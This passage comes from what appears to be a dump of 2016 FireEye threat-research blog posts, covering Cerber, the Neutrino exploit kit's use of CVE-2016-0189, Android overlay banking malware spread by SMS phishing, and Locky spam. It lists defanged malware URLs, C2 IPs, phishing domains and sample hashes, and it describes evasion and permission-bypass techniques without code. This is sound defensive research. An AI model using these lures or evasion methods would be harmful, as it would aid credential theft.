  information enables your organization to quickly stop threats and
  adapt defenses as needed.</p>
 <h5>Conclusion</h5>
 <p>Ransomware has become an increasingly common and effective attack
  affecting enterprises, impacting productivity and preventing users
  from accessing files and data.</p>
 <p>Mitigating the threat of ransomware requires strong endpoint
  controls, and may include technologies that allow security personnel
  to quickly analyze multiple systems and correlate events to identify
  and respond to threats.</p>
 <p>
  <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/hx-endpoint-security-products.html"" target=""_blank"">HX with Exploit Guard</a> uses behavioral
  intelligence to accelerate this process, quickly analyzing endpoints
  within your enterprise and alerting your team so they can conduct an
  investigation and scope the compromise in real-time.</p>
 <p>Traditional defenses don’t have the granular view required to do
  this, nor can they connect the dots of discreet individual processes
  that may be steps in an attack. This takes behavioral intelligence
  that is able to quickly analyze a wide array of processes and alert on
  them so analysts and security teams can conduct a complete
  investigation into what has, or is, transpiring. This can only be done
  if those professionals have the right tools and the visibility into
  all endpoint activity to effectively find every aspect of a threat and
  deal with it, all in real-time. Also, at FireEye, we go one step ahead
  and contact relevant authorities to bring down these types of campaigns.</p>
 <p>Click <a href=""http://investors.fireeye.com/releasedetail.cfm?ReleaseID=958361"">here</a>
  for more information about Exploit Guard technology.</p>",http://www.fireeye.com/blog/threat-research/2016/07/cerber-ransomware-attack.html
Exploit Kits Quickly Adopt Exploit Thanks to Open Source Release,"<p>A security researcher recently published <a href=""https://github.com/theori-io/cve-2016-0189"">source code</a>
  for a working exploit for CVE-2016-0189 and the Neutrino Exploit Kit
  (EK) quickly adopted it.</p>
 <p>CVE-2016-0189 was originally exploited as a zero-day vulnerability
  in <a href=""http://www.symantec.com/connect/blogs/internet-explorer-zero-day-exploit-used-targeted-attacks-south-korea"">targeted
    attacks in Asia</a>. The vulnerability resides within scripting
  engines in Microsoft’s Internet Explorer (IE) browser, and is
  exploited to achieve Remote Code Execution (RCE). According to the
  researcher’s repository, the open source exploit affects IE on at
  least Windows 10. It is possible that attackers could use or repurpose
  the attack for earlier versions of Windows.</p>
 <p>Microsoft patched <a href=""https://technet.microsoft.com/en-us/library/security/ms16-may.aspx"">CVE-2016-0189
    in May on Patch Tuesday</a>. Applying this patch will protect a
  system from this exploit.</p>
 <h5>Attack Details<br /> </h5>
 <p>The popular Neutrino EK was quick to adopt this exploit. Neutrino
  works by embedding multiple exploits into one Shockwave Flash (SWF)
  file. Once run, the SWF profiles the victim’s system – shown in Figure
  1 – to determine which of its embedded exploits to use.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Exploit%20Kits%20Quickly%20Adopt%20Ken%20Johnson/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Neutrino EK SWF profiles a victim</span></p>
 <p>Next, it decrypts and runs the applicable exploit, as shown in
  Figure 2. This is different from most other EKs, in which an earlier
  HTML/JavaScript stage profiles the browser and selectively downloads
  exploits from the server.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Exploit%20Kits%20Quickly%20Adopt%20Ken%20Johnson/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Decrypt and embed the selected exploit
    into an iframe</span></p>
 <p>In this example, Neutrino embedded exploits for five vulnerabilities
  that have been patched since May or earlier: three for Adobe Flash
  Player (CVE-2016-4117, CVE-2016-1019, CVE-2015-8651) and two for
  Internet Explorer (CVE-2016-0189, CVE-2014-6332). CVE-2016-0189 is the
  newest addition to Neutrino’s arsenal.</p>
 <h5>CVE-2016-0189</h5>
 <p>This CVE-2016-0189 vulnerability stems from a failure to put a lock
  on an array before working on it. This omission can lead to an issue
  when the array is changed while another function is in the middle of
  working on it. Memory corruption can occur if the “valueOf “ property
  of the array is set to a script function that changes the array size,
  as shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Exploit%20Kits%20Quickly%20Adopt%20Ken%20Johnson/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Neutrino setting triggering conditions</span></p>
 <p>After Microsoft released the patch, a security researcher compared
  the original and patched programs to identify the root cause of the
  vulnerability and create a fully functioning exploit. The exploit
  embedded within Neutrino is identical to this researcher’s exploit,
  except for the code that runs after initial control.</p>",http://www.fireeye.com/blog/threat-research/2016/07/exploit_kits_quickly.html
The Latest Android Overlay Malware Spreading via SMS Phishing in Europe,"<h5>Introduction</h5>
 <p>In April 2016, while investigating a Smishing campaign dubbed <a href=""https://www.fireeye.com/blog/threat-research/2016/04/rumms-android-malware.html"">RuMMS</a>
  that involved the targeting of Android users in Russia, we also
  noticed three similar Smishing campaigns reportedly spreading in <a href=""http://b0n1.blogspot.com/2016/02/recent-mazarbot-targeting-mobilepay-can.html"">Denmark</a>
  (February 2016), in <a href=""http://b0n1.blogspot.com/2016/02/android-mazarbot-stealing-credit-card.html"">Italy</a>
  (February 2016), and in both Denmark and Italy (April 2016).</p>
 <p>Unlike the RuMMS campaign, these three campaigns in Europe used view
  overlay techniques (the same <a href=""https://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html"">technique</a>
  we described being used by <a href=""https://www.fireeye.com/blog/threat-research/2016/01/slembunk-part-two.html"">SlemBunk</a>
  malware) to present nearly identical credential input UIs as seen in
  benign apps, subsequently tricking unwary users into providing their
  banking credentials.</p>
 <p>Figure 1 shows the process of how these overlay malware spread via
  Smishing and infect Android users.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Overview</span></p>
 <p>Threat actors typically first setup the command and control (C2)
  servers and malware hosting sites, then put the malware apps on the
  hosting sites and send victims SMS messages with an embedded link that
  leads to the malware app. After landing on the user’s device, the
  malware launches a process to monitor which app is running in the
  foreground on the compromised device. When the user launches a benign
  app into the foreground that the malware is programmed to target (such
  as a banking app), the malware overlays a phishing view on top of the
  benign app. The unwary user, assuming that they are using the benign
  app, will enter the required account credentials, which are then sent
  to remote C2 servers controlled by threat actors.</p>
 <p>Through our close monitoring of overlay malware spreading via
  Smishing messages, we recently observed that these types of attacks
  did not stop despite publicity from security researchers. Instead, our
  systematic study revealed some interesting and simultaneously worrying findings:</p>
 <ul> <li>From February 2016 to June 2016, we observed 55 malicious
    binaries used in a series of Smishing campaigns targeting different
    countries in Europe. All the malware samples use the same view
    overlay technique to phish banking credentials, and all share the
    same C2 communication protocol. Besides the three publicly disclosed
    campaigns in <b>Denmark</b> and <b>Italy</b>, we observed the same
    threats targeting <b>Germany</b> in March 2016 and <b>Austria</b>
    from April 2016 to May 2016. In June 2016, we still see new samples
    emerging and being used to target users in Denmark; a few other
    European countries could be impacted as well.</li> <li>The key
    functions of these samples have been the same; however, over time,
    we noticed that the samples keep evolving in a few different
    directions. For example, later campaigns usually <b>targeted more
      benign apps</b> than earlier campaigns, focusing on messaging
    apps, for example, as opposed to banking apps. Also, the malicious
    apps used in later campaigns are often harder to analyze because
      <b>obfuscation techniques</b> were adopted to evade detection. In
    addition, some new functionality was added; in particular, we
    noticed that more recent samples leveraged reflection to bypass the
    SMS writing restriction enforced by the App Ops service (introduced
    in Android 4.3). All of this suggests that threat actors are
      <b>actively improving their code</b>.</li> <li>Unlike the RuMMS
    campaign, which mainly used shared hosting services to distribute
    the malware, the Europe Smishing campaigns show <b>more
    diversity</b> in the associated infrastructure, including the use of
    self-registered domains, compromised websites, and URL shortening
    services. Since February 2016, we observed that 27 <b>Bit.ly</b>
    links have been used. In June 2016, we noticed that another three
    URL shorteners, including <b>tr.im</b>, <b>jar.mar</b> and
    <b>is.gd,</b> were adopted in the latest campaign. This suggests
    that threat actors are trying to <b>diversify the URL shorteners to
      avoid detection.</b></li> <li>In total, we identified <b>12 C2
    servers</b> hosted in <b>five different countries</b> that were
    involved in these campaigns. Among them, the IP address 85.93.5.109
    has been used by 24 malicious apps in two campaigns and 85.93.5.139
    has been used by eight malicious apps. We also observed that <b>four
      C2 servers are within the same 85.93.5.0/24 network segment</b>.
    All this suggests that the threat actors have <b>control over
      considerable network resources</b>.</li> <li>URL shortening
    services usually provide <b>link analytics services</b>, which
    enables us to collect data on how many users (from which countries)
    clicked particular short links and when it happened. Using these
    services, we found there have been at least <b>161,349 </b>clicks on
    the 30 short links redirecting to the overlay malware, each of which
    can lead to the infection of one Android device. The date
    information indicated that <b>most of the clicks occurred in the
      first few days after the links were created</b>.</li> </ul>
 <h5>
  <b>Five Europe Smishing Campaigns</b></h5>
 <p>From February 2016 to April 2016, security researchers reported on
  three campaigns involving Android overlay malware being distributed
  via SMS phishing messages. As described in the reports, those
  campaigns started with SMS phishing messages being sent to a user’s
  phone. An example SMS message in the latest campaign is shown in
  Figure 1. The message roughly translates to, “We could not deliver
  your order. Please check your shipping information here
  hxxp://bit[.]ly/1ZfcNeV”. Users in Denmark and Italy were reported to
  be the primary targets of these three campaigns.</p>
 <p>Our recent investigation revealed that these activities keep
  developing, with other European countries, including <b>Germany</b>
  and <b>Austria</b>, being impacted as well. We group these activities
  into five campaigns, as shown in Table 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Tab1.png"" /></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Tab1.png"" /></p>
 <p>
  <span class=""type-XS"">Table 1. Overview of the five Europe Smishing
    campaigns ordered in the beginning dates</span></p>
 <p>(*: First publicized by FireEye researchers)</p>
 <p>Shortened links were commonly used in the five campaigns. In total,
  we identified 30 short links. Some URL shorteners provide analytics,
  through which anyone can see how many people clicked the link and the
  countries those clicks came from. For example, Figure 2 shows that
  there were 135 clicks from Germany on one of the <b>Whats-Germany</b>
  samples, and 1,633 clicks from Austria on one of the
  <b>Post-Austria</b> samples.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Analytics pages on one Whats-Germany
    sample and one post-Austria sample</span></p>
 <h5>
  <b>Code Evolution</b></h5>
 <p>In the aforementioned Smishing campaigns, we observed that the
  malware code has been evolving over time. The malware author(s) seems
  to be working diligently to improve the code by adding new target
  apps, obfuscating the code to evade detection, and trying to bypass
  App Ops restrictions.</p>
 <h5>
  <b>Adding New Target Apps</b></h5>
 <p>All five campaigns attempt to steal credentials from various
  targeted apps. When the malicious app is started, a background service
  is triggered to periodically monitor the apps running in the
  foreground. When the service detects that the foreground app is one of
  its targeted apps, it overlays a carefully designed phishing view on
  top of the target app.</p>
 <p>Analysis of the malware code shows that this task is executed by a
  method in the main service, named <i>initInjTask</i> in most cases.
  Figure 3 shows the code of <i>initInjTask</i> in one of the earliest
  samples of the <b>MPay-Denmark</b> campaign, in which only a localized
  app named <a href=""http://mobilepay.dk/da-dk/Pages/The-story-in-English.aspx"">MobilePay</a>
  was targeted.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. <i>MobileBank</i> class to be started
    to overlay app named “dk.danskebank.mobilepay”</span></p>
 <p>(code extracted from app with a MD5 of 49dac3b35afb2e8d3605c72d0d83f631)</p>
 <p>Figure 4 shows the code of <i>initInjTask</i> in one <b>Whats-Italy
  </b>sample, in which the target was changed to a more widely used app:
  WhatsApp Messenger.</p>
 <h4>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig4.png"" /></h4>
 <p>
  <span class=""type-XS"">Figure 4. <i>Cards</i> class to be started to
    overlay app named “com.whatsapp”</span></p>
 <p>(code extracted from app with a MD5 of 97c2d04aa0f3c3b446fc228c1dbc4837)</p>
 <p>Figure 5 shows the code of <i>initInjTask</i> in one
    <b>Whats-Germany </b>sample, in which two apps – WhatsApp and the
  Google Play Store – were targeted.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. <i>Cards</i> class to be started to
    overlay apps WhatsApp and Play Store</span></p>
 <p>(code extracted from app with a MD5 of 9e9d9a3717eed4d558a3f5eddb260901)</p>
 <p>Figure 6 shows the code of <i>initInjTask</i> in one <b>Post-Austria
  </b>sample (in this case, the malicious app was obfuscated; the code
  was extracted from the dropped jar file). In total, eight worldwide
  popular apps – including Uber and Tencent’s WeChat – were on its radar.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig6.png"" /></p>
 <p>
  <span class=""type-S"">Figure 6. <i>cqkwjqjtoz</i> class to be started
    to overlay apps 8 popular apps</span></p>
 <p>(code extracted from app with a MD5 of d70296d3dc4937dedd44f93bb3b74034)</p>
 <p>The code examples demonstrate changes in the malware over time.
  Early samples targeted single apps (a localized banking app and
  WhatsApp) while later samples included a broader range of apps,
  suggesting that the threat actors continue to both improve their
  malware and broaden their targeting, presumably for greater financial gain.</p>
 <h5>
  <b>Code Obfuscation</b></h5>
 <p>In earlier campaigns, including MPay-Denmark, Whats-Italy and
  Whats-Germany, most of the malicious apps were not obfuscated and
  experienced reverse engineers can work readily with the disassembled code.</p>
 <p>Figure 7 shows the manifest file and code structures for these
  earlier samples. With these two pieces of information, we see that
  three receivers are registered for various purposes: to handle
  incoming SMS messages; to request device-admin privileges; and to
  start the app at booting time and handle two application-specific
  events. There are also two services designed to be running in the
  background and four activities meant to interact with users. With this
  basic information at hand, adept malware analysts can readily figure
  out the role played by each part of the code and further understand
  how these pieces work together to achieve the malware’s goal.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Code structure and manifest file of
    earlier un-obfuscated code</span></p>
 <p>Since April 2016, we observed that all the samples in our dataset
  had adopted obfuscation techniques. With the obfuscation, the manifest
  file became harder to read and the code structure looked totally different.</p>
 <p>Figure 8 presents one sample in the <b>PostDanmark</b> campaign. The
  code structure on the left shows that there are five classes named
  “<i>a</i>”, “<i>b</i>”, “<i>c</i>”, “<i>d</i>” and “<i>mrtbeig</i>”
  with a same package name of “<i>com.atrdectn.ioitsrc</i>”. At the
  right side, the manifest file shows there are four receivers, seven
  services and four activities declared, with a different package name
  of “<i>com.lpygioep.tjzcverotl</i>”. So where is the code of these
  declared classes? What are the purposes of these classes named at
  left? Here the code is much more complex to analyze.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Code structure and manifest file of
    later obfuscated code</span></p>
 <p>Deeper investigation showed that these classes defined on the left
  side compose the real payload and overlay the phishing view on top of
  the eight popular benign apps. Their code is in fact hidden in the
  asset file named <i>mptxip.dat</i>, which was encoded in a special
  manner beforehand.</p>
 <p>The classes at the left side are actually unpacking code to decode
  the asset file, to load the real payload at runtime, and leverage
  reflection to execute the malicious code in the payload. This process
  is usually much more complex, and involves a round of static analysis
  first to understand what is in the code, then dynamic analysis to
  recover the real payload, and then both analyses to understand the
  real payload. Antivirus vendors often have difficulty identifying such
  threats. As of June 8, 2016, only 6 out of 54 anti-virus tools labeled
  these samples as malicious.</p>
 <h5>Bypassing App Ops Restriction</h5>
 <p>Android uses app permissions to restrict the set of sensitive
  actions a particular app can take. With earlier versions of the
  Android operating system, when an app is installed, the user is
  prompted to agree to the permissions the app requests. If the user
  declines, then the app isn’t installed – it is an all or nothing
  situation. App Ops is a service framework introduced in Android 4.3
  that allows the permissions of individual apps to be changed at
  runtime. With App Ops, users can disallow some permission requests at
  runtime. Interestingly, we observed that, starting from the
  <b>Whats-Italy</b> campaign, the overlay malware began to adopt some
  code to bypass these runtime restrictions.</p>
 <p>Figure 10 shows a code snippet in the class <i>MainService</i>,
  called by the launcher activity at app start time. It checks whether
  the build version of the device is 19 (Android 4.4) and whether the
  WRITE_SMS ops are disabled. If both conditions are true, the malware
  will call the method <i>setWriteEnabled</i> of class <i>SmsWriteOpUtil
  </i>(at line 93) to re-enable the permission of writing SMS.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. Code to check and re-enable the
    permission of writing SMS</span></p>
 <p>Figure 10 shows the major code of <i>SmsWriteOpUtil </i>to re-enable
  the SMS writing permission. At line 60, a handle to the system service
  App Ops is fetched. At line 61, reflection is used to get access to
  the particular class. At line 64 and 65, the reflection methods
  <i>getMethod</i> and <i>invoke</i> are used to call a method named
  <i>setMode</i>. These API methods are usually designed for use by
  other framework code or pre-installed apps. However, in this case
  threat actors use reflection to bypass the App Ops restriction.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10. Code using reflection to call App Ops
    service and to enable writing SMS</span></p>
 <h5>Hosting Sites</h5>
 <p>To execute Smishing campaigns, threat actors first have to determine
  where to host their malware. Shared hosting services were used heavily
  in the RuMMS campaign, but the threat actors in these five campaigns
  varied it up a bit by using self-registered domains, URL shorteners,
  and compromised websites.</p>
 <h5>Self-Registered Domains</h5>
 <p>In our investigation, we noticed that some of the URL domains were
  registered a few days before malware was hosted on the sites. Also, we
  found no other services were provided on these domains. These facts
  lead us to believe that those sites were registered specifically for
  the Smishing campaigns.</p>
 <p>To lure victim users to clicks these links, the domain names were
  often carefully crafted for a particular campaign. For example, in the
  earlier MPay-Denmark campaign, threat actors used the Danish postal
  service provider as a theme and the Smishing messages came as: “You
  received an MMS from XXX. Follow hxxp://mms4you[.]us/mms.apk to view
  the message.” Thus, many of the domains included the words “mms”
  and/or “you”, such as <i>mmsforyou.pw</i>, <i>mmsservice.pw</i> and
  <i>mmstildig.net</i> (“til dig” is “for you” in Danish).</p>
 <p>In the later <b>PostDanmark</b> campaign, the Smishing messages came
  as: “Your package is available for pick up. Follow
  hxxp://postdanmark[.]org/post.apk to see all the information on your
  package:” Thus, many URL domains had the words “post” and/or “danmark”
  present, such as <i>postdanmark.net</i>, <i>postdanmark.online</i>,
  <i>postdanmark.menu</i> and <i>postdanmarks.com</i>. Note that the
  official website for Post Danmark is “www.postdanmark.dk”, so all
  these phishing URLs were actually mimicking the official website for
  Post Danmark.</p>
 <h5>Shortened URLs</h5>
 <p>A small screen size makes shortened URLs perfect for mobile devices.
  Threat actors seem to understand this, and will leverage it for their
  own gain. While monitoring these five Smishing campaigns in Europe, we
  observed shortened URLs being used frequently. In total, we observed
  four different URL shorteners were used at least once, including
  <b>bit.ly</b>, <b>tr.im</b>, <b>is.gd</b> and <b>jar.ma</b>.</p>
 <p>Of the four, <b>bit.ly</b> has been the most commonly used URL
  shortener. In total, we identified <b>27</b> bit.ly links were used
  from February 2016 to June 2016. The other three URL shorteners were
  not observed until June 2016, and only one was used for each service.
  Diversifying URL shorteners suggests that the threat actors are trying
  to avoid detection.</p>
 <h5>Compromised Websites</h5>
 <p>It is costly to use self-registered domains to host malware. More
  capable threat actors might choose to use compromised websites for the
  same purpose. Despite the risk of the victim site detecting the
  compromise and removing the malware, this method can be effective: the
  compromise is often not noticed until some time later, and the number
  of victim clicks is usually highest at the start of a campaign and
  decays a few days after the malware goes online.</p>
 <p>While monitoring the five Smishing campaigns, we observed
  compromised websites were used frequently. For example, the analytics
  page for the shortened URL <u>hxxps://bitly[.]com/1qRey7a+</u> shows
  that on April 13, 2016, website kgiexport.com was hosting an Android
  app with the file named <i>post.apk</i>.</p>
 <h5>How Many Clicks?</h5>
 <p>Two of the four URL shorteners, <b>bit.ly</b> and <b>tr.im</b>,
  provide analytics pages for each short URL created. Figure 2 showed
  analytics pages provided by bit.ly. Figure 13 shows a screenshot of
  the analytics page provided by tr.im. From these pages, we can collect
  data on how many people clicked the shortened URL at particular dates,
  and also the countries these clicks came from.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11. Analytics page provided by tr.im</span></p>
 <p>Table 2 shows relevant information on the 28 short URLs we monitored.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Tab2.png"" /></p>
 <p>
  <span class=""type-XS"">Table 2. Click counts on each short URL</span></p>
 <p>In total, the 28 short links were clicked 161,349 times. Of these
  clicks, 130,636 were from the PostDanmark campaign, which shows that
  phishing messages claiming to be from the post office can be
  effective. We also noticed the number of clicks decayed a few days
  after these short links were created. For example, there were 96,631
  clicks (67.06%) on the first day after short links were created, and
  there were 30,749 clicks (21.33%) on the second day after short links
  were created. These clicks come primarily from two countries: Denmark
  (88.66%) and Austria (5.30%). A handful of other countries might be
  impacted as well, including Germany, Luxembourg, Spain, Sweden,
  Norway, United Kingdom, Netherlands, Italy, Greece, and Turkey. <br /> </p>
 <h5>C2 Server</h5>
 <p>All of the malicious apps we analyzed contacted a hard-coded C2
  server for sending device relevant information and getting back
  instructions. The URL used is in the form of
  http://$C2.$SERVER.$IP/?action=command. In total, we found <b>12 C2
  servers</b> hosted in five different countries were involved in these
  campaigns. Table 3 shows relevant information for each C2 server used
  in these campaigns.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Tab3.png"" /></p>
 <p>
  <span class=""type-XS"">Table 3. C2 Server Relevant Information</span></p>
 <p>In particular, IP address 85.93.5.109 has been used by 24 malicious
  apps in the <b>PostDanmark</b> and <b>post-Austria</b> campaigns. IP
  address 85.93.5.139 has been used by eight malicious apps in the
  <b>PostDanmark</b> campaign. Note that the first four C2 servers are
  within the same 85.93.5.0/24 network segment. In total, we found 38
  malicious samples contacting these four C2 servers from March 2016 to
  June 2016.</p>
 <h5>Part of Something Bigger?</h5>
 <p>While monitoring the registration records for these self-registered
  domains, we found something interesting: in March 2016, a single email
  address (l[REDACTED]a@gmail.com) registered three domains, including
  <i>postdanmark.org</i>, <i>postdanmark.menu </i>and<i>
  mmstildig.info</i>, for two of the five campaigns. Using reverse
  lookup, we found another four similar domains were also registered by
  the same email address in March 2016. Table 4 shows the relevant
  information for these domains.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Latest%20Android%20Overlay%20Wu%20Zhou/Tab4.png"" /></p>
 <p>
  <span class=""type-XS"">Table 4. Domains registered by the suspected
    threat actor (l[REDACTED]a@gmail.com)</span></p>
 <p>The first three domains were used to host overlay malware for the
  MPay-Denmark and PostDanmark campaigns. We found no evidence that the
  latter four domains were used for similar campaigns, but the same
  registrant email address and the similar naming convention implies
  that they may have been created for a similar purpose.</p>
 <h5>Conclusion</h5>
 <p>Smishing (SMS phishing) offers a unique vector to infect mobile
  users. The latest Smishing campaigns spreading in Europe show that
  Smishing is still a popular means for threat actors to distribute
  their malware. In addition, threat actors have been using diversified
  host schemes and different C2 servers, and have been continuously
  refining their malicious code to keep infecting more users and evade detection.</p>
 <p>To protect against these threats, FireEye suggests that users not
  install apps from outside official app stores, and take caution before
  clicking any links where the origin is unclear.</p>
 <p>To detect and defend against such attacks, we advise our customers
  to deploy our mobile security solution, FireEye MTP/MSM. This helps
  our clients gain visibility into threats in their user base, and also
  enables them to proactively hunt down devices that have been
  compromised. In addition, we advise our customers with NX appliances
  to ensure that Wi-Fi traffic is scanned by NX appliances to extend
  coverage to include mobile devices.</p>
 <h5>Appendix: Samples</h5>
 <p>df53b59e354462cd0e704b7b21a750f7<br />
  6eb92667ebbbcb2c7ddf6230462222fd<br />
  3841abcef2b1b37aa7e2d47c535ca80e<br />
  265d37013e1ea39b868515cce157dfeb<br />
  49dac3b35afb2e8d3605c72d0d83f631<br />
  ffe98d97e7d827aa19abb968a528f3fe<br />
  f4b8d64af0a53472901b50621f19d6bf<br />
  e1d79608b649c22004ad7cc1cd049528<br />
  ef5c9b15755719597481c501f6b603ce<br />
  6a300ded487671ef39388b8d28927a83<br />
  d33b718737de5aa685672a2004e0fa3c<br />
  d83d833092a4fa5ecc436d4246c2f7ce<br />
  97c2d04aa0f3c3b446fc228c1dbc4837<br />
  82b1006a5f45a6d2baf69544414ada81<br />
  9e9d9a3717eed4d558a3f5eddb260901<br />
  82d89319fabd998328cc6d4efc4db863<br />
  228a4b723bf3d8adc53a69dd0f36c746<br />
  e911df33f1d156b3309a4ac220c52070<br />
  2b90fca41272bec8b8ffefbb2456c001<br />
  40449a2ec48c3e630b2eb8c8089828cf<br />
  8d0a03981daa93210e184e7fff02883c<br />
  fbdde37d41d12f21c049c570c9bda3de<br />
  a18818cb3fb6f189560991cef6d1f929<br />
  bf7b72dbb2a9155dabc4eda31d273b92<br />
  9762441d52bdec725eff6f2f65e721e9<br />
  dba6b4bbf61e054fb978acaf70c3d849<br />
  93922ee5fbd149f31b0161deca76df77<br />
  035d1f3b7fb532a33de7a8445f9fa325<br />
  3f2017a5acb3e57801e2771341287001<br />
  06e74df867e9cb5c1bafc98165c6c248<br />
  20f4cd2baa09e0bd5e12dab50c0898cd<br />
  af7a8d32865e8caf51a99c52834d4422<br />
  82d89319fabd998328cc6d4efc4db863<br />
  bee3746684b072867a5b202bfc5527dd<br />
  a18818cb3fb6f189560991cef6d1f929<br />
  8959513f65bcca6f16faef59ad2d152f<br />
  cfa92cbcb0674429cc9ce216cc008902<br />
  d73d54f6f86c58030477cc9a96eedb85<br />
  2f4d81ef1b10bf72d0dba0fdf354527f<br />
  701d57504444344b8d5e79bcabcd3dca<br />
  fcb4ef63f1d8a3a044ac6f8a7c262546<br />
  05131969af2ae6cbfddf789512f02aa2<br />
  6e93a7f7911b3e9b522be4b8f950cca4<br />
  542f8f77e101d4e8e5d1ef34a3f0df1c<br />
  d0a6ba40e05047dc2cff12935c4cf4fb<br />
  23988abad7c7b2ecdda23ae7194b7a0d<br />
  2c055d7b5199604cd5cf3441073b36b3<br />
  a72aa534973eeaf0782a246d502107a3<br />
  f1c8a3337cbd56e01e478774f5d55278<br />
  da222d4b7993a62665b9eaef10c1846f<br />
  152f626eb92676f940ada4b7077acf16<br />
  7a99b60349703aed3ab28f498320f247<br />
  1b9e1cd2c7f8e227b2ae5fb5bc735536<br />
  d84ff5a7e7c0c33dcfa237299869bc34<br />
  d70296d3dc4937dedd44f93bb3b74034<br />
  88b23b6a5c1b72aeff2fc42e05c173a7<br /> 036258e2c51e21c140b5838ce9bfb4f8</p>",http://www.fireeye.com/blog/threat-research/2016/06/latest-android-overlay-malware-spreading-in-europe.html
Locky is Back Asking for Unpaid Debts,"<p>On June 21, 2016, FireEye’s Dynamic Threat Intelligence (DTI)
  identified an increase in JavaScript contained within spam emails.
  FireEye analysts determined the increase was the result of a new Locky
  ransomware spam campaign.</p>
 <p>As shown in Figure 1, Locky spam activity was uninterrupted until
  June 1, 2016, when it stopped for nearly three weeks. During this
  period, Locky was the most dominant ransomware distributed in spam
  email. Now, Locky distribution has returned to the level seen during
  the first half of 2016.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Locky spam activity in 2016</span></p>
 <p>Figure 2 shows that the majority of Locky spam email detections
  between June 21 and June 23 of this year were recorded in Japan, the
  United States and South Korea.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Locky spam by country from June 21 to
    June 23 of this year</span></p>
 <p>The spam email – a sample shown is shown in Figure 3 – purports to
  contain an unpaid invoice in an attached ZIP archive. Instead of an
  invoice, the ZIP archive contains a Locky downloader written in JavaScript.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Locky spam email</span></p>
 <h5>
  <b>JavaScript based Downloader Updates</b></h5>
 <p>In this campaign, few updates were seen in both the JavaScript based
  downloader and the Locky payload.</p>
 <p>The JavaScript downloader does the following:</p>
 <ol> <li>Iterates over an array of URLs hosting the Locky payload.</li>
    <li>If a connection to one of the URLs fails, the JavaScript sleeps
    for 1,000 ms before continuing to iterate over the array of
  URLs.</li> <li>Uses a custom XOR-based decryption routine to decrypt
    the Locky payload.</li> <li>Ensures the decrypted binary is of a
    predefined size. In Figure 4 below, the size of the decrypted binary
    had to be greater than 143,360 bytes and smaller than 153,660 bytes
    to be executed.</li> </ol>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Payload download function in JavaScript</span></p>
 <p>5.     Checks (Figure 5) that the first two bytes of the binary
  contain the “MZ” header signature.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20is%20Back%20Joonho%20Sa/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: MZ header check</span></p>
